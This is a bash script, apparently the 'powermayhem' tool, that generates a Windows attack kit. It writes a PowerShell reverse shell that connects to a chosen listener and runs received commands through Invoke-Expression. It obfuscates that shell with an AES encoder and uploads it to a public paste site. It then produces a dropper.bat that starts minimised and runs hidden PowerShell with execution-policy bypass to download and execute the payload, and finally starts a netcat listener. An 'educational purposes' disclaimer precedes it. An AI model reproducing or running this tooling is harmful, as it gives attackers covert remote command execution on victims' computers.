#!/bin/bash

clear

RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
BLUE="$(printf '\033[34m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
RESETBG="$(printf '\e[0m\n')"
WHITEBG="$(printf '\033[47m')"

cat << EOF

Message From - [ ${RED}jungawagat${WHITE} ] :
As the creator of this tool [ ${GREEN}powermayhem${WHITE} ]
I hereby declare that I will not be held responsible for any misuse of this tool
This tool was created solely for educational purposes and as a personal project
The user of this tool assumes all legal responsibilities associated with its use !

EOF

read -p "${WHITE}[**] Do You Accept The Terms ?? [${RED}yes${WHITE}] ~> " answer
if [ $answer != "yes" ] ; then
echo "${RED}"
echo "[**] What A Waste Of Words : Quitting !"
echo ""
exit
fi

cat << EOF

${GREEN}d8888b    d88b   db   d8b   db d88888b d8888b   88b  d88    d8b   db    db db   db d88888b  88b  d88
${GREEN}88   8D  8P  Y8  88   I8I   88 88      88   8D 88 YbdP 88 d8   8b  8b  d8  88   88 88      88 YbdP 88
${GREEN}88oodD  88    88 88   I8I   88 88ooooo 88oobY  88  88  88 88ooo88   8bd8   88ooo88 88ooooo 88  88  88
${GREEN}88ooo   88    88 Y8   I8I   88 88ooooo 88 8b   88  88  88 88ooo88    88    88ooo88 88ooooo 88  88  88
${GREEN}88       8b  d8   8b d8 8b d8  88      88  88  88  88  88 88   88    88    88   88 88      88  88  88
${GREEN}88        Y88P     8b8   8d8   Y88888P 88   YD YP  YP  YP YP   YP    YP    YP   YP Y88888P YP  YP  YP

${WHITEBG}${RED}---------------------------- https://github.com/jungawagat/powermayhem ------------------------------${RESETBG}

EOF

if ! command -v curl &>/dev/null ; then
echo ""
echo "[ powermayhem ] : {RED}I Require Curl But Not Installed !"
echo ""
exit
fi

if ! command -v pwsh &>/dev/null ; then
echo ""
echo "[ powermayhem ] : {RED}I Require PowerShell But Not Installed !"
echo ""
exit
fi

if ! command -v nc &>/dev/null ; then
echo ""
echo "[ powermayhem ] : {RED}I Require NetCat But Not Installed !"
echo ""
exit
fi

if ! nc -z google.com 80 > /dev/null 2>&1 ; then
echo ""
echo "${RED}[ powermayhem ] : {RED}No Internet Connection !"
echo ""
exit
fi

read -p "[ powermayhem ] : ${GREEN}Enter Your Listener HOST : ${WHITE}" host
read -p "[ powermayhem ] : ${GREEN}Enter Your Listener PORT : ${WHITE}" port

cat << EOF > temp.ps1
\$server = "$host"
\$port = "$port"

while(-not(Test-Connection -ComputerName "8.8.8.8" -Count 1 -Quiet)){Start-Sleep 5}
\$TCPClient = New-Object Net.Sockets.TCPClient("\$server", \$port)
\$NetworkStream = \$TCPClient.GetStream()
\$StreamWriter = New-Object IO.StreamWriter(\$NetworkStream)

function WriteToStream (\$String)
{
[byte[]]\$script:Buffer = 0..\$TCPClient.ReceiveBufferSize | % {0}
\$StreamWriter.Write(\$String + '[ powermayhem ] > ')
\$StreamWriter.Flush()
}

WriteToStream ''

while((\$BytesRead = \$NetworkStream.Read(\$Buffer, 0, \$Buffer.Length)) -gt 0)
{
\$Command = ([text.encoding]::UTF8).GetString(\$Buffer, 0, \$BytesRead - 1)
\$Output = try {Invoke-Expression \$Command 2>&1 | Out-String} catch {\$_ | Out-String}
WriteToStream (\$Output)
}

\$StreamWriter.Close()
EOF

echo ""
echo "[ AES-Encoder ] : ${GREEN}Using AES-Encoder : Author - ${RED}Chainski${WHITE}"
echo ""
pwsh aes.ps1 ; rm temp.ps1
echo ""

upload=$(curl -F text=@shell.ps1 https://upaste.de/ -s ; rm shell.ps1)
code=$(echo $upload | cut -d "/" -f 4)
if [ code == "" ]
then
echo "[ powermayhem ] : ${RED} Failed Uploading Payload"
exit
else
url="https://upaste.de/raw/$code"
echo "[ powermayhem ] : ${GREEN}Payload Uploaded To : $url ${WHITE}"
fi

cat << EOF > dropper.bat
@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
powershell -w hidden -ep bypass -c "iex([System.Net.WebClient]::new().DownloadString('$url'))"
exit
EOF

echo ""
echo "[ powermayhem ] : ${GREEN}Generated A Dropper ${WHITE}: ( ${RED}dropper.bat${WHITE} ) - ${BLUE}" $(pwd)"/dropper.bat ${WHITE}"
echo ""
echo "[ powermayhem ] : ${BLUE}Note ${WHITE}-${GREEN} These Droppers Will Be ${RED}Inactive ${GREEN}After 1 Hour ! ${WHITE}"
echo ""

echo "[ powermayhem ] : ${BLUE}Listenting For Incoming Connection ${WHITE}{👂}"
echo ""
nc -lvnp $port

exit

